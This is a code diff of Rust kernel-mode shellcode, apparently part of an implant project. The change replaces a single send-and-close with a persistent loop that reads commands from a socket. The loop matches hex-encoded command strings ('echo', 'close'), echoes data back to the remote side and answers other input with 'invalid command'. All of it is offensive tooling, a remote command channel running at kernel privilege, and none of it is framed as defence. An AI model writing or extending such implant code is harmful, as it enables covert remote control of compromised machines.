@@ -74,7 +74,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     let mut kirql: ntdef::types::KIRQL;
     let mut buf: ntdef::types::PVOID = ntdef::enums::NULL;
     let mut buf_len: u32 = 0;
-    let mut send: u32 = 0 as _;
+    let mut exec: u32 = 0 as _;
 
     let mut close: u8 = 0;
     while close == 0u8 {
@@ -89,17 +89,26 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             buf_len = (*tdi_ctx).buf_len as _;
             ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
             ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer, 0);
-            send = 1 as _;
+            exec = 1 as _;
             (*tdi_ctx).msg_available = 0u32;
         }
         (*tdi_ctx).sync = 0u32;
         ((*tdi_ctx).funcs.ke_lower_irql)(kirql);
-        if send == 1u32 { 
-            let _ = socket.send(buf as _, buf_len as _);
+        if exec == 1u32 {
+            let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
+            let close_cmd = [0x63u8, 0x6cu8, 0x6fu8, 0x73u8, 0x65u8, 0x0au8];
+            if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
+                // let _ = socket.send(buf.offset(5) as *const u8, buf_len - 5);
+                let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
+                _ = socket.close();
+                close = 1 as _;
+            } else {
+                let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
+                let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
+            }
             ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 0);
-            send = 0 as _;
-            _ = socket.close();
-            close = 1 as _;
+            exec = 0 as _;
         }
     }
     // this is to avoid errors if returning to a cleaning-up module
